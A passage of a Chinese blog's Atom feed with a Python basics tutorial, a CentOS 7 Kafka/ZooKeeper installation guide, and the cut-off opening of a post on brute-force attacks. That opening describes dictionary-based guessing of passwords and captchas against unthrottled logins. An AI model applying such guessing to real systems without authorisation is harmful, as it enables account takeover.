    <updated>2020-09-18T06:24:59.764Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134047614.png" alt="image-20200918134047614"></p><h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="关于python"><a href="#关于python" class="headerlink" title="关于python"></a>关于python</h2><p>Python是一种直译式(Interpreted )、面向对象(Object Oriented )的程序语言，所谓的直译式语言是指，直译器(Interpretor)会将程序代码一句一句直接执行，不需要经过编译(compile)动作，将语言先转换成机器码，再予以执行。目前它的直译器是CPython，这是由C语言编写的一个直译程序。</p><p>Python的最初设计者是吉多·范罗姆苏(Guido van Rossum)，目前Python语言是由Python软件基金会管理，有关新版软件的相关信息可以在这个基金会网址(<a href="http://www.python.org)上下载浏览。" target="_blank" rel="noopener">www.python.org)上下载浏览。</a></p><p>2000年10月16日Python 2.0正式发表，主要是增加了垃圾回收的功能，同时支持Unicode。2008年12月3日Python 3.0正式发表，Python 2.7x已经被确定为最后一个Python 2.x的版本。</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134202904.png" alt="image-20200918134202904"></p><p>Python是一种跨平台的程序语言，几乎主要操作系统，例如，Windows、MacOS、UNIX/LINUX等，皆可以安装和使用，可以在某一个平台上使用Python设计一个程序，未来这个程序也可以在其他平台上顺利运作。</p><h2 id="python的应用"><a href="#python的应用" class="headerlink" title="python的应用"></a>python的应用</h2><p>python的应用范围很广，部分应用范围为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">设计动画游戏</span><br><span class="line"></span><br><span class="line">支持图形接口(Graphical User Interface，GUI)开发</span><br><span class="line"></span><br><span class="line">开发与管理网站</span><br><span class="line"></span><br><span class="line">执行大数据分析</span><br><span class="line"></span><br><span class="line">企业内部开发工具</span><br><span class="line"></span><br><span class="line">黑客攻防</span><br></pre></td></tr></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>程序注释主要功能是让你所设计的程序可读性更高，更容易了解。</p><h4 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h4><p>“#”符号右边的文字，称程序注释，Python语言的直译器会忽略此符号右边的文字。</p><h4 id="单引号或双引号"><a href="#单引号或双引号" class="headerlink" title="单引号或双引号"></a>单引号或双引号</h4><p>如果要进行大段落的注释，可以用三个单引号或双引号将注释文字包夹。</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量是一个暂时存储数据的地方，在Python中可以用“=”等号设定变量的内容。</p><h4 id="变量的命名规则"><a href="#变量的命名规则" class="headerlink" title="变量的命名规则"></a>变量的命名规则</h4><p>Python对于变量的命名有一些规则要遵守，否则会造成程序错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">必须由英文字母、_(下画线)或中文字开头，建议使用英文字母</span><br><span class="line"></span><br><span class="line">变量名称只能由英文字母、数字、_(下画线)或中文字所组成</span><br><span class="line"></span><br><span class="line">英文字母大小写是敏感的，例如，Name与name被视为不同变量名称</span><br><span class="line"></span><br><span class="line">Python系统保留字（或称关键词）或Python内置函数名称不可当作变量名称</span><br></pre></td></tr></table></figure><p>下列是不可当作变量名称的Python系统保留字</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134656457.png" alt="image-20200918134656457"></p><p>下列是不可当作变量名称的Python系统内置函数</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134858584.png" alt="image-20200918134858584"></p><p>不合法变量示例</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918135000191.png" alt="image-20200918135000191"></p><h2 id="基本数学运算"><a href="#基本数学运算" class="headerlink" title="基本数学运算"></a>基本数学运算</h2><h4 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h4><p>四则运算是指加( + )、减( - )、乘( × )和除( / )。</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918135802081.png" alt="image-20200918135802081"></p><h4 id="余数和整除"><a href="#余数和整除" class="headerlink" title="余数和整除"></a>余数和整除</h4><p>余数(mod)所使用的符号是“%”，可计算出除法运算中的余数。整除所使用的符号是“//”，是指除法运算中只保留整数部分。</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918140437516.png" alt="image-20200918140437516"></p><h4 id="次方"><a href="#次方" class="headerlink" title="次方"></a>次方</h4><p>次方的符号是“ ** ”。</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918140547002.png" alt="image-20200918140547002"></p><h4 id="运算的优先级"><a href="#运算的优先级" class="headerlink" title="运算的优先级"></a>运算的优先级</h4><p>Python语言碰上计算式同时出现在一个指令内时，除了括号“ (”、“)”最优先外，其余计算优先次序如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.次方</span><br><span class="line"></span><br><span class="line">2.乘法、除法、求余数(%)、求整数(&#x2F;&#x2F;)，彼此依照出现顺序运算</span><br><span class="line"></span><br><span class="line">3.加法、减法，彼此依照出现顺序运算</span><br></pre></td></tr></table></figure><h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><p>常见的赋值运算符如下：</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918141445718.png" alt="image-20200918141445718"></p><h4 id="等号的多重指定使用"><a href="#等号的多重指定使用" class="headerlink" title="等号的多重指定使用"></a>等号的多重指定使用</h4><p>使用Python时，可以一次设定多个变量等于某一数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x&#x3D;y&#x3D;z&#x3D;10</span><br><span class="line">x&#x3D;10</span><br><span class="line">y&#x3D;10</span><br><span class="line">z&#x3D;10</span><br></pre></td></tr></table></figure><p>Python也允许多个变量同时指定不同的数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x,y,z &#x3D;10,20,30</span><br><span class="line">x&#x3D;10</span><br><span class="line">y&#x3D;20</span><br><span class="line">z&#x3D;30</span><br></pre></td></tr></table></figure><p>将2个变量内容交换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x,y&#x3D;10,20</span><br><span class="line">x,y&#x3D;y,x</span><br><span class="line">x&#x3D;20</span><br><span class="line">y&#x3D;10</span><br></pre></td></tr></table></figure><h4 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h4><p>程序设计时，如果某个变量不再需要，可以使用del指令将此变量删除，相当于可以收回原变量所占的内存空间，以节省内存空间。</p><p>删除格式为：del 变量名称</p><h4 id="python的断行"><a href="#python的断行" class="headerlink" title="python的断行"></a>python的断行</h4><p>将一个语句分成多行：</p><p>碰上一个语句很长，需要分成2行或更多行撰写，此时可以在叙述后面加上“\”符号，Python解释器会将下一行的语句视为这一行的语句。特别注意，在“\”符号右边不可加上任何符号或文字，即使是注释符号也不允许。</p><p>也可以在语句内使用小括号，如果使用小括号，就可以在语句右边加上注释符号。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>CentOS7安装kafka</title>
    <link href="http://yoursite.com/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/"/>
    <id>http://yoursite.com/2020/08/02/CentOS7安装kafka/</id>
    <published>2020-08-02T10:11:31.000Z</published>
    <updated>2020-08-04T15:38:21.506Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="CentOS7下安装kafka"><a href="#CentOS7下安装kafka" class="headerlink" title="CentOS7下安装kafka"></a>CentOS7下安装kafka</h1><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><p>Kafka 服务端代码是用 Scala 开发语言编写的，Scala 是 JVM 系语言中的一种，这意味着用 Scala 编写的源代码编译之后也是 Java 字节码，并运行在 Java 虚拟机上。因此，在开始安装 Kafka 之前，我们需要先在系统上安装 JDK（Java SE Development Kit， Java SE开发套件），JDK 包含的 JRE（Java SE Runtime Environment，Java 运行时环境）是运行 Java 应用程序所必需的。</p><p>多数情况下，推荐安装 JDK 8 及以上的版本，因为 Kafka 自 2.0.0 版本开始，就已经正式摒弃对 Java 7 的支持了。另外，运行 Kafka 还需要安装 Apache ZooKeeper 服务，该服务是用来同步分布式进程。</p><h2 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h2><h4 id="1、环境"><a href="#1、环境" class="headerlink" title="1、环境"></a>1、环境</h4><p>操作系统：centos7.4</p><p>安装包版本： jdk-8u221-linux-x64.tar.gz</p><h4 id="2、卸载系统自带-OpenJDK"><a href="#2、卸载系统自带-OpenJDK" class="headerlink" title="2、卸载系统自带 OpenJDK"></a>2、卸载系统自带 OpenJDK</h4><p>如果 CentOS 系统中集成了 OpenJDK，那么需要先卸载自带的 OpenJDK 才能安装标准版 JDK，卸载具体步骤如下：</p><p>1、系统终端输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep java</span><br></pre></td></tr></table></figure><p>若系统中集成了 OpenJDK，会出现 xxxx_openjdk_xxxx 的信息；</p><p>2、删除 OpenJDK：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -e --nodeps rpm -qa | grep java</span><br></pre></td></tr></table></figure><h4 id="3、安装JDK1-8"><a href="#3、安装JDK1-8" class="headerlink" title="3、安装JDK1.8"></a>3、安装JDK1.8</h4><p>1、将下载的安装包使用winscp拷贝至服务器<code>/usr/local/src</code>目录下。</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802182606968.png" alt="image-20200802182606968"></p><p>2、新建JDK安装目录 <code>/usr/local/java</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;java</span><br></pre></td></tr></table></figure><p>3、解压文件 jdk-8u221-linux-x64.tar.gz 至安装目录 /usr/local/java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf jdk-8u221-linux-x64.tar.gz -C &#x2F;usr&#x2F;local&#x2F;java</span><br></pre></td></tr></table></figure><p>4、配置环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>JAVA_HOME为JDK安装目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_221</span><br><span class="line">export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre</span><br><span class="line">export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib</span><br><span class="line">export PATH&#x3D;$&#123;JAVA_HOME&#125;&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure><p>5、让更新的环境变量生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>6、检测安装是否成功，若安装并配置成功，可以看到以输出；如果得到诸如“-bash: java: 未找到命令 ”就需要退回去反复检査安装和配置步骤是否正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802183301282.png" alt="image-20200802183301282"></p><h2 id="安装和配置ZooKeeper"><a href="#安装和配置ZooKeeper" class="headerlink" title="安装和配置ZooKeeper"></a>安装和配置ZooKeeper</h2><h4 id="1、下载安装包"><a href="#1、下载安装包" class="headerlink" title="1、下载安装包"></a>1、下载安装包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src</span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;mirror.bit.edu.cn&#x2F;apache&#x2F;zookeeper&#x2F;zookeeper-3.5.8&#x2F;apache-zookeeper-3.5.8-bin.tar.gz</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802184047139.png" alt="image-20200802184047139"></p><h4 id="2、新建-安装目录"><a href="#2、新建-安装目录" class="headerlink" title="2、新建 安装目录"></a>2、新建 安装目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p &#x2F;usr&#x2F;local&#x2F;zookeeper</span><br></pre></td></tr></table></figure><h4 id="3、解压至zookeeper目录"><a href="#3、解压至zookeeper目录" class="headerlink" title="3、解压至zookeeper目录"></a>3、解压至zookeeper目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src</span><br><span class="line"></span><br><span class="line">tar zxvf apache-zookeeper-3.5.8-bin.tar.gz -C &#x2F;usr&#x2F;local&#x2F;zookeeper</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802184509754.png" alt="image-20200802184509754"></p><h4 id="4、配置zookeeper"><a href="#4、配置zookeeper" class="headerlink" title="4、配置zookeeper"></a>4、配置zookeeper</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;conf</span><br><span class="line">[root@172 conf]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root  535 May  4 21:26 configuration.xsl</span><br><span class="line">-rw-r--r--. 1 root root 2712 May  4 21:26 log4j.properties</span><br><span class="line">-rw-r--r--. 1 root root  922 May  4 21:26 zoo_sample.cfg</span><br></pre></td></tr></table></figure><p>1) 复制 zoo_sample.cfg 并重命名为 zoo.cfg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp zoo_sample.cfg zoo.cfg</span><br></pre></td></tr></table></figure><p>2) 创建 ZooKeeper 保存数据目录和保存日志目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;data &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;logs</span><br></pre></td></tr></table></figure><p>3) 修改配置文件 zoo.cfg，修改内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dataDir&#x3D;&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;data </span><br><span class="line">dataLogDir&#x3D;&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;logs</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802185319790.png" alt="image-20200802185319790"></p><p>保存并退出文件修改。</p><p>4) 启动zookeeper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;bin&#x2F;</span><br><span class="line"></span><br><span class="line">[root@172 bin]# .&#x2F;zkServer.sh start</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfg</span><br><span class="line">Starting zookeeper ... STARTED</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802185712170.png" alt="image-20200802185712170"></p><p>ZooKeeper启动成功</p><h2 id="安装kafka"><a href="#安装kafka" class="headerlink" title="安装kafka"></a>安装kafka</h2><h4 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h4><p>从 Kafka 官网下载页 <a href="https://kafka.apache.org/downloads" target="_blank" rel="noopener">https://kafka.apache.org/downloads</a> 获取安装文件，当前最新的稳定版本是 2.4.1，于 2020 年 3 月 12 日发行。这里选择下载二进制文件 kafka_2.12-2.4.1.tgz。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src</span><br><span class="line">wget https:&#x2F;&#x2F;mirror.bit.edu.cn&#x2F;apache&#x2F;kafka&#x2F;2.4.1&#x2F;kafka_2.12-2.4.1.tgz</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802193122030.png" alt="image-20200802193122030"></p><h4 id="2、创建安装目录"><a href="#2、创建安装目录" class="headerlink" title="2、创建安装目录"></a>2、创建安装目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;kafka</span><br></pre></td></tr></table></figure><h4 id="3、解压缩"><a href="#3、解压缩" class="headerlink" title="3、解压缩"></a>3、解压缩</h4><p>解压缩文件 kafka_2.12-2.4.1.tgz 至目录 /usr/local/kafka：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xvzf kafka_2.12-2.4.1.tgz -C &#x2F;usr&#x2F;local&#x2F;kafka --strip 1</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802193436385.png" alt="image-20200802193436385"></p><p>进入目录 /usr/local/kafka，可以看到以下子目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@172 src]# cd &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;</span><br><span class="line">[root@172 kafka]# ll</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x. 3 root root  4096 Mar  3 08:34 bin</span><br><span class="line">drwxr-xr-x. 2 root root  4096 Mar  3 08:34 config</span><br><span class="line">drwxr-xr-x. 2 root root  8192 Aug  2 19:34 libs</span><br><span class="line">-rw-r--r--. 1 root root 32216 Mar  3 08:32 LICENSE</span><br><span class="line">-rw-r--r--. 1 root root   337 Mar  3 08:32 NOTICE</span><br><span class="line">drwxr-xr-x. 2 root root    44 Mar  3 08:34 site-docs</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin目录下是操作 Kafka 的可执行脚本（.sh 文件），还包含在 windows 系统下的可执行脚本（.bat 文件），包括 Kafka 启动&#x2F;停止脚本、消费者性能测试脚本、生产者性能测试脚本、分区重分配脚本等；</span><br><span class="line"></span><br><span class="line">&#x2F;config目录是存放配置文件；</span><br><span class="line"></span><br><span class="line">&#x2F;libs目录是存放依赖库文件；</span><br><span class="line"></span><br><span class="line">&#x2F;logs目录存放的是 Kafka 的运行日志文件。</span><br></pre></td></tr></table></figure><h4 id="4、配置"><a href="#4、配置" class="headerlink" title="4、配置"></a>4、配置</h4><p>打开配置文件config/server.properties，修改 listeners 配置和 zookeeper 地址，具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;监听地址</span><br><span class="line">listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;172.16.12.144:9092</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;zookeeper地址</span><br><span class="line">zookeeper.connect&#x3D;172.16.12.144:2181</span><br></pre></td></tr></table></figure><p>保存退出</p><h4 id="5、添加kafka账号"><a href="#5、添加kafka账号" class="headerlink" title="5、添加kafka账号"></a>5、添加kafka账号</h4><p>在启动 Kafka 服务之前，为保障系统安全，添加运行 Kafka 服务的账号，并以较低权限账号运行 Kafka 服务，且禁用该账号的 ssh 登录权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;添加kafka账号</span><br><span class="line">useradd kafka</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;设置kafka账号密码</span><br><span class="line">passwd kafka</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;将目录所有者和组设置为kafka</span><br><span class="line">chown -R kafka:kafka &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;</span><br></pre></td></tr></table></figure><p>切换至 kafka 账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su kafka</span><br></pre></td></tr></table></figure><p>kafka日志保存位置设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config</span><br><span class="line">vim server.properties</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804233616568.png" alt="image-20200804233616568"></p><p>将log存放目录设置为非/tmp目录即可，然后对目录进行赋权即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R kafka:kafka &#x2F;data</span><br></pre></td></tr></table></figure><h4 id="6、启动kafka服务"><a href="#6、启动kafka服务" class="headerlink" title="6、启动kafka服务"></a>6、启动kafka服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;</span><br><span class="line">&#x2F;bin&#x2F;kafka-server-start.sh .&#x2F;config&#x2F;server.properties</span><br></pre></td></tr></table></figure><p>以守护进程（后台进程）的方式启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;bin&#x2F;kafka-server-start.sh .&#x2F;config&#x2F;server.properties &amp;</span><br></pre></td></tr></table></figure><h4 id="7、停止kafka服务"><a href="#7、停止kafka服务" class="headerlink" title="7、停止kafka服务"></a>7、停止kafka服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;kafka</span><br><span class="line">.&#x2F;bin&#x2F;kafka-server-stop.sh</span><br></pre></td></tr></table></figure><h2 id="kafka可视化"><a href="#kafka可视化" class="headerlink" title="kafka可视化"></a>kafka可视化</h2><h4 id="1、可视化工具"><a href="#1、可视化工具" class="headerlink" title="1、可视化工具"></a>1、可视化工具</h4><p>kafka的可视化工具为kafkatool，可用于查看kafka消息队列中的内容及上报和消费。</p><p>下载地址：https[]]://www[.]kafkatool.com/download.html</p><p>可选择相应的版本和操作系统进行下载</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804231604138.png" alt="image-20200804231604138"></p><h4 id="2、工具简单使用"><a href="#2、工具简单使用" class="headerlink" title="2、工具简单使用"></a>2、工具简单使用</h4><p>安装完成后，搜索kafkatool打开</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804231807412.png" alt="image-20200804231807412"></p><p>点击file，新增连接</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804231949654.png" alt="image-20200804231949654"></p><p>连接设置界面如下</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232053262.png" alt="image-20200804232053262"></p><p>需要设置的地方，其他默认即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cluster name:集群名称</span><br><span class="line">kafka version:版本根据安装的kafka版本选择对应的版本</span><br><span class="line">Zookeeper host：zookeeper服务器IP</span><br></pre></td></tr></table></figure><p>点击ping测试是否联通</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232551742.png" alt="image-20200804232551742"></p><h4 id="3、设置队列内容显示格式"><a href="#3、设置队列内容显示格式" class="headerlink" title="3、设置队列内容显示格式"></a>3、设置队列内容显示格式</h4><p>设置消息队列中的内容显示格式，点击tools，选择settings</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232754502.png" alt="image-20200804232754502"></p><p>点击topics，可以将key和message都设置为string显示，key不要设置为NO key</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232905027.png" alt="image-20200804232905027"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>http[]s://w[]ww.linjiangxiong.com/2020/03/19/how-to-install-apache-kafka-on-centos7/</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>暴力破解</title>
    <link href="http://yoursite.com/2020/08/01/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/08/01/暴力破解/</id>
    <published>2020-08-01T14:41:26.000Z</published>
    <updated>2020-08-01T14:42:17.290Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.原理</span><br><span class="line">使用自定义字典文件中的内容与验证程序交互，从而在枚举过程中得到正确数据。</span><br><span class="line">如破解用户名、密码</span><br><span class="line">破解验证码</span><br><span class="line"></span><br><span class="line">暴力破解的前提：</span><br><span class="line">应用程序或服务器未进行限制</span><br><span class="line">具有内容涵盖全面的字典</span><br><span class="line"></span><br><span 